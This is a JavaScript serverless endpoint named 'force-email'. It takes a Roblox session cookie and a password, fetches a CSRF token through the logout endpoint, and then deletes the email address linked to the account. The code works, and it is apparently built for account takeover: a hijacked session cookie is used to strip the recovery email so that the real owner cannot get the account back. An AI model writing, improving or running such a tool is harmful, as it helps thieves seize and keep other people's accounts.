// File: api/force-email.js

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { cookie, password } = req.body;

    if (!cookie || !password) {
        return res.status(400).json({ error: 'Missing cookie or password' });
    }

    try {
        // 1️⃣ Get CSRF Token
        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
            }
        });

        const csrfToken = csrfRes.headers.get('x-csrf-token');

        if (!csrfToken) {
            throw new Error('Failed to get CSRF token (invalid cookie?)');
        }

        // 2️⃣ Force remove email
        const emailRes = await fetch('https://accountinformation.roblox.com/v1/email', {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
                'Cookie': `.ROBLOSECURITY=${cookie}`,
            },
            body: JSON.stringify({
                password: password
            })
        });

        const emailData = await emailRes.json();

        if (emailRes.ok) {
            return res.status(200).json({ message: 'Email removed successfully!' });
        } else {
            return res.status(emailRes.status).json({ error: emailData.errors?.[0]?.message || 'Failed to force email' });
        }

    } catch (err) {
        console.error('Force email error:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
